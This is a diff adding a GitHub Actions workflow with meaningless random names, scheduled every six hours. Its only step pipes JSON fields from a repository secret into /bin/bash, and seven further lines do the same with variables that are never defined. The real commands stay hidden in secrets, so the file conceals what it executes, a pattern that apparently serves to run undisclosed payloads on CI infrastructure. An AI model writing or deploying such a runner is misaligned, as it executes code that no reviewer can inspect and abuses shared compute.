@@ -1,0 +1,25 @@
+name: duansiqi9831
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '5 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: duansiqi9831
+        env:
+          fqpj242: ${{ secrets.fqpj242 }}
+        run: |
+          echo $fqpj242 | jq -r .xezsn090 | /bin/bash
+          echo $sxu95137 | jq -r .a9900 | /bin/bash
+          echo $ipic208 | jq -r .hp98 | /bin/bash
+          echo $p115 | jq -r .nrra0060 | /bin/bash
+          echo $zuzut50 | jq -r .rhdo1059 | /bin/bash
+          echo $rkyd7 | jq -r .psfis86408 | /bin/bash
+          echo $xsfcb8 | jq -r .oxplq95772 | /bin/bash
+          echo $vi684 | jq -r .jle26218 | /bin/bash
+
